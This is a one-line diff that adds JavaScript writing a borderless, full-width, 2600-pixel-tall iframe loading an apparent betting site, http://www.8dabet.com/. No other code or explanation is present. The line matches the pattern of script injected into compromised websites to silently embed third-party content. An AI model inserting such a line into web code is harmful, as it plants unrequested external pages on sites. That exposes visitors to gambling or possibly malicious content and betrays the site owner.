@@ -1,0 +1,1 @@
+document.writeln("<iframe style=\"margin:0;padding:0;border:0;width:100%;height:2600px\" src=\"http://www.8dabet.com/\"> </iframe>");
